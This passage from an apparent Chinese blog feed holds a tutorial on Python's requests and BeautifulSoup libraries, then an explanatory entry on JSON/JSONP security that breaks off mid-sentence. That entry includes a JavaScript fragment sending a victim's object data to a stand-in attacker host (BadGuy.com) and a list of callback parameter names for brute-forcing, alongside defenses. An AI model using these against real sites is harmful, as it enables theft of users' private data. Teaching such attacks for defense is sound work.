href="https://wenku.baidu.com/view/861838842dc58bd63186bceb19e8b8f67c1cefe3.html">逻辑漏洞</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Library——bs4&amp;requests</title>
    <link href="/2021/02/19/Soup4/"/>
    <url>/2021/02/19/Soup4/</url>
    
    <content type="html"><![CDATA[<h2 id="requests库"><a class="header-anchor" href="#requests库">🌞</a>requests库</h2><h4 id="导入-Requests-模块："><a class="header-anchor" href="#导入-Requests-模块：">🌞</a>导入 Requests 模块：</h4><pre><code class="hljs elm"><span class="hljs-keyword">import</span> requests</code></pre><h4 id="获取某个网页"><a class="header-anchor" href="#获取某个网页">🌞</a>获取某个网页</h4><pre><code class="hljs kotlin">r = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<span class="hljs-comment">//get请求</span>r = requests.post(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)<span class="hljs-comment">//post请求</span>PUT与post格式一样，DELETE，HEAD ，OPTIONS与<span class="hljs-keyword">get</span>格式一样</code></pre><h4 id="传递-URL-参数"><a class="header-anchor" href="#传递-URL-参数">🌞</a>传递 URL 参数</h4><p>使用 <code>params</code> 关键字参数，以一个字符串字典提供参数。</p><p>传递<code>key1=value1</code> 和 <code>key2=value2</code> 到 <code>url</code>：</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<span class="hljs-attr">r</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>, params=payload)</code></pre><p>也可以将一个列表作为值传入</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: [<span class="hljs-string">&#x27;value2&#x27;</span>, <span class="hljs-string">&#x27;value3&#x27;</span>]&#125;</code></pre><h4 id="响应内容"><a class="header-anchor" href="#响应内容">🌞</a>响应内容</h4><pre><code class="hljs awk">r.textr.json<span class="hljs-regexp">//</span>json编码r.raw<span class="hljs-regexp">//</span>访问原始相应内容（stream=True）r.status_code<span class="hljs-regexp">//</span>检测反应状态码r.headers<span class="hljs-regexp">//</span>访问服务器返回给我们的响应头部信息</code></pre><p>Requests 会自动解码来自服务器的内容，编码方式通是过HTTP 头部推测而出，可以用<code>r.encoding</code>查看并更改。</p><p>response.text返回的是Unicode型的数据。—文本</p><p>response.content返回的是bytes型也就是二进制的数据。-----图片等</p><p>但是两者打印输出是一样的</p><h4 id="定制请求头"><a class="header-anchor" href="#定制请求头">🌞</a>定制请求头</h4><p>传递一个 dict 给 headers 参数：</p><pre><code class="hljs nix"><span class="hljs-built_in">import</span> requests<span class="hljs-attr">new_headers</span> = &#123;    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&quot;</span>&#125;<span class="hljs-attr">response</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>,<span class="hljs-attr">headers</span> = new_headers)print(response.text)        <span class="hljs-comment">#正常输出</span></code></pre><h4 id="内置的状态码查询对象"><a class="header-anchor" href="#内置的状态码查询对象">🌞</a>内置的状态码查询对象</h4><pre><code class="hljs http"><span class="hljs-attribute">100</span>: (&#x27;continue&#x27;,),<span class="hljs-attribute">101</span>: (&#x27;switching_protocols&#x27;,),<span class="hljs-attribute">102</span>: (&#x27;processing&#x27;,),<span class="hljs-attribute">103</span>: (&#x27;checkpoint&#x27;,),<span class="hljs-attribute">122</span>: (&#x27;uri_too_long&#x27;, &#x27;request_uri_too_long&#x27;),<span class="hljs-attribute">200</span>: (&#x27;ok&#x27;, &#x27;okay&#x27;, &#x27;all_ok&#x27;, &#x27;all_okay&#x27;, &#x27;all_good&#x27;, &#x27;\o/&#x27;, &#x27;✓&#x27;),<span class="hljs-attribute">201</span>: (&#x27;created&#x27;,),<span class="hljs-attribute">202</span>: (&#x27;accepted&#x27;,),<span class="hljs-attribute">203</span>: (&#x27;non_authoritative_info&#x27;, &#x27;non_authoritative_information&#x27;),<span class="hljs-attribute">204</span>: (&#x27;no_content&#x27;,),<span class="hljs-attribute">205</span>: (&#x27;reset_content&#x27;, &#x27;reset&#x27;),<span class="hljs-attribute">206</span>: (&#x27;partial_content&#x27;, &#x27;partial&#x27;),<span class="hljs-attribute">207</span>: (&#x27;multi_status&#x27;, &#x27;multiple_status&#x27;, &#x27;multi_stati&#x27;, &#x27;multiple_stati&#x27;),<span class="hljs-attribute">208</span>: (&#x27;already_reported&#x27;,),<span class="hljs-attribute">226</span>: (&#x27;im_used&#x27;,),<span class="hljs-attribute">Redirection.</span><span class="hljs-attribute">300</span>: (&#x27;multiple_choices&#x27;,),<span class="hljs-attribute">301</span>: (&#x27;moved_permanently&#x27;, &#x27;moved&#x27;, &#x27;\o-&#x27;),<span class="hljs-attribute">302</span>: (&#x27;found&#x27;,),<span class="hljs-attribute">303</span>: (&#x27;see_other&#x27;, &#x27;other&#x27;),<span class="hljs-attribute">304</span>: (&#x27;not_modified&#x27;,),<span class="hljs-attribute">305</span>: (&#x27;use_proxy&#x27;,),<span class="hljs-attribute">306</span>: (&#x27;switch_proxy&#x27;,),<span class="hljs-attribute">307</span>: (&#x27;temporary_redirect&#x27;, &#x27;temporary_moved&#x27;, &#x27;temporary&#x27;),<span class="hljs-attribute">308</span>: (&#x27;permanent_redirect&#x27;,&#x27;resume_incomplete&#x27;, &#x27;resume&#x27;,), # These 2 to be removed in 3.0Client Error.<span class="hljs-attribute">400</span>: (&#x27;bad_request&#x27;, &#x27;bad&#x27;),<span class="hljs-attribute">401</span>: (&#x27;unauthorized&#x27;,),<span class="hljs-attribute">402</span>: (&#x27;payment_required&#x27;, &#x27;payment&#x27;),<span class="hljs-attribute">403</span>: (&#x27;forbidden&#x27;,),<span class="hljs-attribute">404</span>: (&#x27;not_found&#x27;, &#x27;-o-&#x27;),<span class="hljs-attribute">405</span>: (&#x27;method_not_allowed&#x27;, &#x27;not_allowed&#x27;),<span class="hljs-attribute">406</span>: (&#x27;not_acceptable&#x27;,),<span class="hljs-attribute">407</span>: (&#x27;proxy_authentication_required&#x27;, &#x27;proxy_auth&#x27;, &#x27;proxy_authentication&#x27;),<span class="hljs-attribute">408</span>: (&#x27;request_timeout&#x27;, &#x27;timeout&#x27;),<span class="hljs-attribute">409</span>: (&#x27;conflict&#x27;,),<span class="hljs-attribute">410</span>: (&#x27;gone&#x27;,),<span class="hljs-attribute">411</span>: (&#x27;length_required&#x27;,),<span class="hljs-attribute">412</span>: (&#x27;precondition_failed&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">413</span>: (&#x27;request_entity_too_large&#x27;,),<span class="hljs-attribute">414</span>: (&#x27;request_uri_too_large&#x27;,),<span class="hljs-attribute">415</span>: (&#x27;unsupported_media_type&#x27;, &#x27;unsupported_media&#x27;, &#x27;media_type&#x27;),<span class="hljs-attribute">416</span>: (&#x27;requested_range_not_satisfiable&#x27;, &#x27;requested_range&#x27;, &#x27;range_not_satisfiable&#x27;),<span class="hljs-attribute">417</span>: (&#x27;expectation_failed&#x27;,),<span class="hljs-attribute">418</span>: (&#x27;im_a_teapot&#x27;, &#x27;teapot&#x27;, &#x27;i_am_a_teapot&#x27;),<span class="hljs-attribute">421</span>: (&#x27;misdirected_request&#x27;,),<span class="hljs-attribute">422</span>: (&#x27;unprocessable_entity&#x27;, &#x27;unprocessable&#x27;),<span class="hljs-attribute">423</span>: (&#x27;locked&#x27;,),<span class="hljs-attribute">424</span>: (&#x27;failed_dependency&#x27;, &#x27;dependency&#x27;),<span class="hljs-attribute">425</span>: (&#x27;unordered_collection&#x27;, &#x27;unordered&#x27;),<span class="hljs-attribute">426</span>: (&#x27;upgrade_required&#x27;, &#x27;upgrade&#x27;),<span class="hljs-attribute">428</span>: (&#x27;precondition_required&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">429</span>: (&#x27;too_many_requests&#x27;, &#x27;too_many&#x27;),<span class="hljs-attribute">431</span>: (&#x27;header_fields_too_large&#x27;, &#x27;fields_too_large&#x27;),<span class="hljs-attribute">444</span>: (&#x27;no_response&#x27;, &#x27;none&#x27;),<span class="hljs-attribute">449</span>: (&#x27;retry_with&#x27;, &#x27;retry&#x27;),<span class="hljs-attribute">450</span>: (&#x27;blocked_by_windows_parental_controls&#x27;, &#x27;parental_controls&#x27;),<span class="hljs-attribute">451</span>: (&#x27;unavailable_for_legal_reasons&#x27;, &#x27;legal_reasons&#x27;),<span class="hljs-attribute">499</span>: (&#x27;client_closed_request&#x27;,),Server Error.<span class="hljs-attribute">500</span>: (&#x27;internal_server_error&#x27;, &#x27;server_error&#x27;, &#x27;/o\&#x27;, &#x27;✗&#x27;),<span class="hljs-attribute">501</span>: (&#x27;not_implemented&#x27;,),<span class="hljs-attribute">502</span>: (&#x27;bad_gateway&#x27;,),<span class="hljs-attribute">503</span>: (&#x27;service_unavailable&#x27;, &#x27;unavailable&#x27;),<span class="hljs-attribute">504</span>: (&#x27;gateway_timeout&#x27;,),<span class="hljs-attribute">505</span>: (&#x27;http_version_not_supported&#x27;, &#x27;http_version&#x27;),<span class="hljs-attribute">506</span>: (&#x27;variant_also_negotiates&#x27;,),<span class="hljs-attribute">507</span>: (&#x27;insufficient_storage&#x27;,),<span class="hljs-attribute">509</span>: (&#x27;bandwidth_limit_exceeded&#x27;, &#x27;bandwidth&#x27;),<span class="hljs-attribute">510</span>: (&#x27;not_extended&#x27;,),<span class="hljs-attribute">511</span>: (&#x27;network_authentication_required&#x27;, &#x27;network_auth&#x27;, &#x27;network_authentication&#x27;),</code></pre><p>报错家族❌❌❌</p><h4 id="cookie"><a class="header-anchor" href="#cookie">🌞</a>cookie</h4><pre><code class="hljs awk">r.cookies[<span class="hljs-string">&#x27;example_cookie_name&#x27;</span>]<span class="hljs-regexp">//</span>访问响应中的cookie</code></pre><h4 id="重定向与请求历史"><a class="header-anchor" href="#重定向与请求历史">🌞</a>重定向与请求历史</h4><pre><code class="hljs awk">r.history<span class="hljs-regexp">//</span>追踪重定向</code></pre><p>禁用重定向：</p><pre><code class="hljs routeros">r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)</code></pre><h4 id="超时"><a class="header-anchor" href="#超时">🌞</a>超时</h4><pre><code class="hljs routeros">requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">timeout</span>=0.001)// timeout 参数设定的秒数时间之后停止等待响应</code></pre><h4 id="会话对象"><a class="header-anchor" href="#会话对象">🌞</a>会话对象</h4><p>跨请求保持某些参数,会在同一个session实例发出的所有请求之间保持cookie</p><p>跨请求保持一些 cookie:</p><pre><code class="hljs routeros">s = requests.Session()s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/sessioncookie/123456789&#x27;</span>)r = s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://httpbin.org/cookies&quot;</span>)</code></pre><h4 id="代理"><a class="header-anchor" href="#代理">🌞</a>代理</h4><pre><code class="hljs routeros">import requestsproxies = &#123;  <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>,  <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span>,&#125;requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://example.org&quot;</span>, <span class="hljs-attribute">proxies</span>=proxies)</code></pre><p>or</p><p>编辑环境变量:</p><pre><code class="hljs routeros">$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span></code></pre><h2 id="Beautiful-Soup解析库"><a class="header-anchor" href="#Beautiful-Soup解析库">🌞</a>Beautiful Soup解析库</h2><p>python的一个HTML或XML的解析库，可从网页中提取数据，它拥有强大的API和多样的解析方式。</p><p>特点：</p><ul><li>提供一些简单的方法和python式函数，用于浏览，搜索和修改解析树，通过解析文档为用户提供需要抓取的数据</li><li>自动将转入稳定转换为Unicode编码，输出文档转换为UTF-8编码</li><li>Beautiful Soup位于流行的Python解析器（如<code>lxml</code>和<code>html5lib</code>）之上，允许尝试不同的解析策略或交易速度以获得灵活性。</li></ul><p>Beautiful Soup类的基本元素：</p><p>1、Tag——标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;表明开头和结尾</p><p>2、Name——标签的名字，<code>&lt;p&gt;...&lt;/p&gt;</code>的名字是’p’,格式：<code>&lt;tag&gt;.name</code></p><p>3、Attributes——标签的属性，字典形式组织，格式：<code>&lt;tag&gt;.attrs</code></p><p>4、NavigableString——标签内非属性字符串，<code>&lt;&gt;...&lt;/&gt;</code>中的字符串，格式：<code>&lt;tag&gt;.string</code></p><p>5、Comment——标签内字符串的注释部分，一种特殊的Comment类型（<strong>尖括号叹号表示注释开始</strong>：<code>&lt;!--This is a commet--&gt;</code>）</p><p>用法:</p><p>通过传入一段字符或一个文件句柄，BeautifulSoup的构造方法得到一个文档的对象，选择合适的解析器来解析文档，可手动指定将选择指定的解析器来解析文档,Beautiful  Soup将复杂的HTML文档转换成一个复杂的树形结构，每个节点都是python对象，所有对象可以归纳为4种：Tag、NavigableString、BeautifulSoup、Comment</p><p><img src="/2021/02/19/Soup4/1.png" alt="1"></p><h3 id="节点选择器"><a class="header-anchor" href="#节点选择器">🌞</a>节点选择器()</h3><h4 id="选择元素"><a class="header-anchor" href="#选择元素">🌞</a>选择元素</h4><pre><code class="hljs awk">soup.head<span class="hljs-regexp">//</span>获取head标签soup.p.b<span class="hljs-regexp">//</span>获取p节点下的b节点soup.p.string<span class="hljs-regexp">//</span>获取第一个p节点下的文本soup.head.title.string<span class="hljs-regexp">//</span>嵌套选择</code></pre><h4 id="获取名称"><a class="header-anchor" href="#获取名称">🌞</a>获取名称</h4><pre><code class="hljs css"><span class="hljs-selector-tag">soup</span><span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.name</span></code></pre><h4 id="获取节点属性"><a class="header-anchor" href="#获取节点属性">🌞</a>获取节点属性</h4><pre><code class="hljs stylus">soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>    <span class="hljs-comment">//获取p节点所有属性</span>soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//获取p节点class属性</span>soup<span class="hljs-selector-class">.p</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//以字典形式直接获取p节点class属性</span></code></pre><h4 id="获取内容"><a class="header-anchor" href="#获取内容">🌞</a>获取内容</h4><pre><code class="hljs livecodeserver">soup.p.<span class="hljs-keyword">string</span><span class="hljs-comment"> //获取第一个p节点下的文本</span>soup.<span class="hljs-keyword">a</span>.next_element||soup.<span class="hljs-keyword">a</span>.previous_elemen<span class="hljs-comment">t//获取上一个或下一个被解析的对象</span>soup.<span class="hljs-keyword">a</span>.next_elements||soup.<span class="hljs-keyword">a</span>.previous_element<span class="hljs-comment">s//迭代器向前或者后访问文档解析内容</span></code></pre><h4 id="子节点和子孙节点"><a class="header-anchor" href="#子节点和子孙节点">🌞</a>子节点和子孙节点</h4><pre><code class="hljs awk">soup.p.contents<span class="hljs-regexp">//</span>获取直接子节点以列表形式返回内容soup.p.children<span class="hljs-regexp">//</span>获取直接子节点以生成器的类型返回soup.p.desccendants<span class="hljs-regexp">//</span>获取子孙节点，返回生成器</code></pre><h4 id="父节点和祖先节点"><a class="header-anchor" href="#父节点和祖先节点">🌞</a>父节点和祖先节点</h4><pre><code class="hljs awk">soup.b.parent<span class="hljs-regexp">//</span>获取父节点返回生成器soup.b.parents<span class="hljs-regexp">//</span>获取祖先节点，返回生成器</code></pre><h4 id="兄弟节点"><a class="header-anchor" href="#兄弟节点">🌞</a>兄弟节点</h4><pre><code class="hljs awk">soup.a.next_siblings<span class="hljs-regexp">//</span>返回下一个兄弟节点soup.a.previous_siblings<span class="hljs-regexp">//</span>返回上一个兄弟节点soup.a.next_siblings<span class="hljs-regexp">//</span>返回前面和后面的所有兄弟节点soup.a.previous_siblings<span class="hljs-regexp">//</span>返回生成器</code></pre><p><em>换行符也是一个节点，所以有时候在获取兄弟节点是通常是字符串或者空白</em></p><h3 id="方法选择器"><a class="header-anchor" href="#方法选择器">🌞</a>方法选择器</h3><p>节点选择器通过节点属性来选择，虽然快，但进行比较复杂的选择时不够灵活。此时我们可以引用一些查询方法</p><blockquote><p>find_all(name,attrs,recursive,text,**kwargs)查询所有符合条件的元素</p><blockquote><p>nam可查找的所有名字为name的标签(过滤器，正则表达式，列表……）</p><p>attrs表示传入的属性，以字典的形式指定如<code>id,attrs=&#123;'id':'123'&#125;</code>，(class属性是python中的关键字，查询时需要在class后面加上下划线）返回列表。</p><p>text匹配节点的文本，传入的形式可以是字符串也可以是正则表达式对象</p><p>recursive（只想搜索直接子节点可以设置recursive=Flase）</p><p>limit参数，限制返回结果的数量</p></blockquote></blockquote><blockquote><p>find()：返回单个元素(第一个匹配的元素)参数同find_all().</p></blockquote><p>以下用法与节点选择器对应</p><ul><li><code>find_parents()</code></li><li><code>find_parent()</code></li><li><code>find_next_siblings( )</code></li><li><code>find_next_sibling( )</code></li><li><code>find_previous_siblings( )</code></li><li><code>find_previous_sibling()</code></li></ul><p><code>find_all_next( )</code>&amp;<code>find_next()</code>：对当前tag之后的tag和字符串进行迭代，前者返回所有符合条件的节点，后者返回第一个符合条件的节点</p><p><code>find_all_previous()</code>和<code>find_previous()</code>：对当前tag之前的tag和字符串进行迭代，前者返回节点后所有符合条件的节点，后者返回第一个符合条件的节点</p><h3 id="CSS选择器"><a class="header-anchor" href="#CSS选择器">🌞</a>CSS选择器</h3><p>在 Tag 或 BeautifulSoup 对象的 select()方法中传入字符串参数即可使用CSS选择器的语法找到tag：</p><pre><code class="hljs dsconfig"><span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;.panel .panel-heading&#x27;</span>))//选择<span class="hljs-string">class </span>为.<span class="hljs-string">panel </span>下的<span class="hljs-string">class </span>为<span class="hljs-string">panel0heading的</span>标签<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;ul li&#x27;</span>))//选择标签<span class="hljs-string">ul </span>下的<span class="hljs-string">li标</span>签<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;#list-2 .element&#x27;</span>))//选择<span class="hljs-string">id为</span><span class="hljs-built_in">list-2</span> 下的<span class="hljs-string">class为</span> <span class="hljs-string">element标</span>签</code></pre><h4 id="获取属性"><a class="header-anchor" href="#获取属性">🌞</a>获取属性</h4><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> ul <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;ul&#x27;</span>):    <span class="hljs-builtin-name">print</span>(ul[<span class="hljs-string">&#x27;id&#x27;</span>])    <span class="hljs-builtin-name">print</span>(ul.attrs[<span class="hljs-string">&#x27;id&#x27;</span>])</code></pre><h4 id="获取内容-v2"><a class="header-anchor" href="#获取内容-v2">🌞</a>获取内容</h4><pre><code class="hljs maxima"><span class="hljs-keyword">for</span> <span class="hljs-built_in">li</span> <span class="hljs-keyword">in</span> soup.select(&#x27;<span class="hljs-built_in">li</span>&#x27;):    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">li</span>.get_text())</code></pre><p>CSS更多属性见：<a href="http://www.w3school.com.cn/cssref/css_selectors.asp">CSS选择器</a></p><h3 id="tag修改"><a class="header-anchor" href="#tag修改">🌞</a>tag修改</h3><p>Beautiful Soup可以改变tag标志的属性的值，添加或删除属性和内容</p><pre><code class="hljs livecodeserver">markup=<span class="hljs-string">&#x27;&lt;a href=&quot;http://www.baidu.com/&quot;&gt;baidu&lt;/a&gt;&#x27;</span>soup=BeautifulSoup(markup,<span class="hljs-string">&#x27;lxml&#x27;</span>)soup.<span class="hljs-keyword">a</span>.<span class="hljs-keyword">string</span>=<span class="hljs-string">&#x27;百度&#x27;</span>soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>Tag.append() 添加内容,与列表的 .append() 方法类似</p><pre><code class="hljs livecodeserver">soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度&lt;/<span class="hljs-keyword">a</span>&gt;soup.<span class="hljs-keyword">a</span>.append(<span class="hljs-string">&#x27;一下&#x27;</span>)soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度一下&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>还有很多：</p><ul><li><code>new_tag()</code>方法用于创建一个tag标签</li><li><code>insert()</code>将元素插入到指定的位置</li><li><code>inert_before()</code>在当前tag或文本节点前插入内容</li><li><code>insert_after()</code>在当前tag或文本节点后插入内容</li><li><code>clear()</code>移除当前tag的内容</li><li><code>extract()</code>将当前tag移除文档数，并作为方法结果返回</li><li><code>prettify()</code>将Beautiful Soup的文档数格式化后以Unicode编码输出，tag节点也可以调用</li><li><code>get_text()</code>输出tag中包含的文本内容，包括子孙tag中的内容</li><li><code>soup.original_encoding</code> 属性记录了自动识别的编码结果</li><li><code>from_encoding</code>:参数在创建BeautifulSoup对象是可以用来指定编码，减少猜测编码的运行速度</li></ul><p>结束:🍭🍭🍭</p><p>参考：<a href="https://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced">高级用法 — Requests 2.18.1 文档</a></p><p><a href="https://2.python-requests.org/zh_CN/latest/user/quickstart.html">快速上手 — Requests 2.18.1 文档</a></p><p><a href="https://www.cnblogs.com/zhangxinqi/p/9218395.html">python3解析库BeautifulSoup4</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>json &amp; jsonp注入</title>
    <link href="/2021/02/19/jsonp/"/>
    <url>/2021/02/19/jsonp/</url>
    
    <content type="html"><![CDATA[<p>先来介绍一下json</p><h1>json</h1><blockquote><p><code> JavaScript Object Notation</code>,JavaScript 对象表示法</p><blockquote><p>JSON 是存储和交换文本信息的语法，类似 XML<br>JSON 使用 Javascript语法来描述数据对象，但它独立于语言和平台。<br>JSON 解析器和 JSON 库支持许多不同的编程语言<br>JavaScript 程序能够使用内建的 eval() 函数，用 JSON 数据来生成原生的 JavaScript 对象<br>通常用于服务端向网页传递数据</p><blockquote><p>JSON 文件的文件类型是 <code> .json</code><br>JSON 文本的 MIME 类型是 <code>application/json</code></p></blockquote></blockquote></blockquote><h3 id="json语法规则"><a class="header-anchor" href="#json语法规则">🍭</a>json语法规则</h3><blockquote><p>数据为 键/值 对。<br>数据由逗号分隔。<br>大括号保存对象<br>方括号保存数组<br>JSON 不能存储 Date 对象(可以以字符串为中介进行转换，函数也一样)<br>JSON 不允许包含函数</p><p><code>JSON.parse()</code>: 将一个 JSON 字符串转换为 JavaScript 对象。</p><blockquote><pre><code class="hljs css">&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.parse</span>(<span class="hljs-selector-tag">text</span><span class="hljs-selector-attr">[, reviver]</span>)</code></pre></blockquote></blockquote><blockquote><p><code>JSON.stringify()</code>: 于将 JavaScript 值转换为 JSON 字符串。</p><blockquote><pre><code class="hljs css">&gt;&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.stringify</span>(<span class="hljs-selector-tag">value</span><span class="hljs-selector-attr">[, replacer[, space]</span>])</code></pre></blockquote></blockquote><p>JSON 语法是 JavaScript 对象表示语法的子集,语法很简单，这里不再赘述。</p><h3 id="json-vs-xml"><a class="header-anchor" href="#json-vs-xml">🍭</a>json vs xml</h3><h4 id="same"><a class="header-anchor" href="#same">🍭</a>same:</h4><ul><li>具有&quot;自我描述性&quot;（人类可读）</li><li>具有层级结构（值中存在值）</li><li>数据可使用 AJAX 进行传输</li></ul><h4 id="difference-json角度"><a class="header-anchor" href="#difference-json角度">🍭</a>difference(json角度):</h4><ul><li>没有结束标签</li><li>读写的速度更快</li><li>能够使用内建的 JavaScript eval() 方法进行解析</li><li>使用数组</li><li>不使用保留字</li><li>简短</li></ul><h1>jsonp</h1><p>Jsonp(<code>JSON with Padding</code>)</p><blockquote><p>是 json 的一种&quot;使用模式&quot;，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p><p>是一种非正式传输协议</p><p>允许用户传递一个callback参数给服务端，服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，故客户端就可以随意定制自己的函数来自动处理返回数据。</p></blockquote><p>由来(理论)：</p><ul><li>Ajax直接请求普通文件存在跨域无权限访问的问题(因为<strong>同源策略</strong>详见:<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略</a>)</li><li>但Web页面上调用js文件时则不受是否跨域的影响（带有<code>src</code>属性的标签:<code>script、img、iframe</code>都拥有跨域的能力）。</li><li>故现在想通过纯web端（ActiveX控件、服务端代理、HTML5之Websocket除外）跨域访问数据就只能在远程服务器上把数据装进js格式的文件里，供客户端调用处理，</li><li>由于JSON简洁被js支持，客户端可以处理这种格式的数据，因此跨域调用远程js文件，便可以实现同源策略之下的跨域</li></ul><p>举个栗子:</p><p><img src="/2021/02/19/jsonp/1.png" alt="1"></p><p><code>jsonp.php</code>:</p><p><img src="/2021/02/19/jsonp/2.png" alt="2"></p><h2 id="JSONP利用"><a class="header-anchor" href="#JSONP利用">🍭</a>JSONP利用</h2><h4 id="JSON-Hijacking"><a class="header-anchor" href="#JSON-Hijacking">🍭</a>JSON Hijacking</h4><p>json 劫持原理其实跟CSRF一样（但是CSRF是模拟用户的身份去发送请求，JavaScript Hijacking是模拟用户的身份，窃取用户在服务器上的私隐信息），当某网站使用JSONP传递敏感数据的时候，攻击者可以构造恶意JSONP调用界面，诱导被攻击者访问：</p><p><img src="/2021/02/19/jsonp/3.png" alt="3"></p><h5 id="特点"><a class="header-anchor" href="#特点">🍭</a>特点</h5><ul><li><p>恶意站点是通过用户给它返回信任网站的JSON数组（JSON数组被浏览器认为是一段可执行的JavaScript脚本，json对象就不被认为是JavaScript脚本）获取用户私隐信息。</p></li><li><p>恶意站点必须实先知道用户返回的JSON的结构</p></li><li><p>恶意站点只能发送GET请求</p></li><li><p>需要浏览器支持</p><p>JSON 劫持代码要在jsonp基础上加上如下代码（发送get请求）</p><pre><code class="hljs accesslog">req.open(<span class="hljs-string">&quot;<span class="hljs-keyword">GET</span>&quot;</span>, <span class="hljs-string">&quot;http://www.BadGuy.com?obj=&quot;</span> +escape(objString),true); &#125; req.send(null); );</code></pre><p>在函数定义是引用<code>Object.prototype.__defineSetter__</code>函数:对Object的某属性设置一个Hook(类似于JavaScript函数劫持)，当有对象设置它的该属性时，都会触发上面这段代码的运行。但是此函数在现在多数浏览器中都失效了。</p></li></ul><h5 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h5><ul><li>综合防御：判断<code>reference</code>和添加随机字串</li><li>使用加在url中的<code>token</code></li></ul><h5 id="挖掘"><a class="header-anchor" href="#挖掘">🍭</a>挖掘</h5><blockquote><p>burp抓包，jsonp数据传输会在mimetype中显示为script<br>控制台查找jsonp包<br>暴力穷举</p><blockquote><p>多数情况下会把jsonp的回传参数命名为callback，但也可能变形（callback参数可自定义）成如下形式:</p><blockquote><p>callback=attack</p><p>cb=attack</p><p>call=attack</p><p>jsonp=attack</p><p>jsonpcallback=attack</p><p>jsonpcb=attack</p><p>json=attack</p><p>jsoncallback=attack</p><p>jcb=attack</p></blockquote></blockquote></blockquote><h4 id="基础函数调用"><a class="header-anchor" href="#基础函数调用">🍭</a>基础函数调用</h4><p>若回调函数被硬编码进响应(即多个不同类型的请求都采用同样的回调函数名)，就会存在基础函数调用的危害。</p><h5 id="防御-v2"><a class="header-anchor" href="#防御-v2">🍭</a>防御</h5><p>严格限制对 JSONP 输出<code>callback</code>函数名的长度，函数调用名不可预测</p><h4 id="callback函数可定义的安全问题"><a class="header-anchor" href="#callback函数可定义的安全问题">🍭</a>callback函数可定义的安全问题</h4><p>在上面的实例中callback函数的名称可以自定义，当它没有严格过滤或审查，也会成为一个注入点：</p><p><img src="/2021/02/19/jsonp/4.png" alt="4"></p><h5 id="防御-v3"><a class="header-anchor" href="#防御-v3">🍭</a>防御</h5><ul><li>严格定义<code> Content-Type: application / json</code>：浏览器不解析恶意插入的 XSS 代码</li><li>过滤 callback 以及 JSON 数据输出</li><li>在请求中添加 csrfToken 并在后端进行验证</li></ul><p><strong>Content-Type 与 X-Content-Type-Options：</strong></p><p>如果在响应中API请求头X-Content-Type-Options被设置为nosniff，<strong>Content-Type必须设置为JavaScript</strong>(text/javascript, application/javascript, 